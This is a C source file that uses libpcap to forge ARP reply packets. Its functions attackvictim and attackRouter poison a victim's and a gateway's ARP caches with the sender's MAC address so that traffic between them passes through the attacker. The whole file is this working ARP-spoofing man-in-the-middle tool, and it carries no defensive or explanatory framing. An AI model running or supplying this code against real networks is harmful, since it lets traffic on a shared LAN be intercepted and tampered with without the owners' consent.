#include "myHeader.h"

u_char arpPacket[ARPSIZE + ETHERNETSIZE];

int attackvictim(pcap_t* handle, Pethernet_header ethernetHeader, Parp_header arpHeader, PLANINFO LanInfo);
int attackRouter(pcap_t* handle, Pethernet_header ethernetHeader, Parp_header arpHeader, PLANINFO LanInfo);

int sendFakeARP(pcap_t* handle, PLANINFO LanInfo)
{
	arp_header arpHeader;
	ethernet_header ethernetHeader;

	ethernetHeader.ether_Type = ntohs(0x0806);
	arpHeader.Hardware_type = ntohs(0x0001);
	arpHeader.Protocol_type = ntohs(0x0800);
	arpHeader.Hardware_size = 0x06;
	arpHeader.Protocol_size = 0x04;
	arpHeader.Opcode = ntohs(0x0002); // reply
	attackvictim(handle, &ethernetHeader, &arpHeader, LanInfo);
	Sleep(1500);
	attackRouter(handle, &ethernetHeader, &arpHeader, LanInfo);
	return 0;
}

int attackvictim(pcap_t* handle, Pethernet_header ethernetHeader, Parp_header arpHeader, PLANINFO LanInfo)
{
	/* set header */
	memcpy(ethernetHeader->dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(ethernetHeader->src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(arpHeader->src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(arpHeader->src_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));		// FAKE
	memcpy(arpHeader->dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(arpHeader->dst_IP, &LanInfo->victimIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(arpPacket, ethernetHeader, sizeof(char) * ETHERNETSIZE);
	memcpy(arpPacket + ETHERNETSIZE, arpHeader, sizeof(char) * ARPSIZE);
	// send to router
	if (pcap_sendpacket(handle, arpPacket, ARPSIZE + ETHERNETSIZE /* size */) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}

int attackRouter(pcap_t* handle, Pethernet_header ethernetHeader, Parp_header arpHeader, PLANINFO LanInfo)
{
	/* set header */
	memcpy(ethernetHeader->dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(ethernetHeader->src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(arpHeader->src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(arpHeader->src_IP, &LanInfo->victimIP, sizeof(IN_ADDR));		// FAKE
	memcpy(arpHeader->dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(arpHeader->dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(arpPacket, ethernetHeader, sizeof(char) * ETHERNETSIZE);
	memcpy(arpPacket + ETHERNETSIZE, arpHeader, sizeof(char) * ARPSIZE);
	// send to router
	if (pcap_sendpacket(handle, arpPacket, ARPSIZE + ETHERNETSIZE /* size */) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}